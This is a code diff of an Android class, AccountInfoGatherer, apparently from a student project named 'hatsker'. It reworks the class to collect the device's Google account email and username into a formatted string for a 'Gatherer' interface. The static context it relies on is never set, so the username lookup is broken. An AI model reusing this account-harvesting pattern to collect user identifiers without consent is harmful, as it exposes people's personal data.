@@ -3,6 +3,7 @@ package com.example.student.hatsker;
 import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.content.Context;
+import android.net.Uri;
 import android.util.Log;
 
 import java.util.LinkedList;
@@ -14,14 +15,16 @@ import java.util.List;
 
 public class AccountInfoGatherer implements Gatherer {
 
+    private static Context contextj;
     private final Context context;
+    private String strGmail;
 
     AccountInfoGatherer(Context context)
     {
         this.context = context;
     }
 
-    public String getInfo() {
+    public String getMailId() {
         String strGmail = null;
         try {
             Account[] accounts = AccountManager.get(context).getAccounts();
@@ -33,8 +36,7 @@ public class AccountInfoGatherer implements Gatherer {
 
                 if (type.equals("com.google")) {
 
-                    strGmail = possibleEmail;
-                    Log.e("PIKLOG", "Emails: " + strGmail);
+                    strGmail = "email: "+possibleEmail+" ; ";
                     break;
                 }
             }
@@ -46,16 +48,17 @@ public class AccountInfoGatherer implements Gatherer {
         return strGmail;
     }
 
-    public static String getUsername(MainActivity this_) {
+    public static String getUsername() {
         List<String> possibleEmails = null;
         try {
-            AccountManager manager = AccountManager.get(this_);
+            AccountManager manager = AccountManager.get(contextj);
             Account[] accounts = manager.getAccountsByType("com.google");
             possibleEmails = new LinkedList<>();
 
             for (Account account : accounts) {
-
-
+                // TODO: Check possibleEmail against an email regex or treat
+                // account.name as an email address only for certain account.type
+                // values.
                 possibleEmails.add(account.name);
             }
         } catch (Exception e) {
@@ -70,17 +73,22 @@ public class AccountInfoGatherer implements Gatherer {
                 String email = possibleEmails.get(0);
                 String[] parts = email.split("@");
                 if (parts.length > 0 && parts[0] != null) {
-                    return parts[0];
+                    return "username: "+parts[0]+" ; ";
 
                 } else {
-                    return null;
+                    return "username: not detected ; ";
                 }
             } else {
-                return null;
+                return "username: not detected ; ";
             }
         } else {
-            return null;
+            return "username: not detected ; ";
         }
     }
 
+    @Override
+    public String getInfo() {
+        strGmail=getMailId()+"\n"+getUsername();
+        return strGmail;
+    }
 }
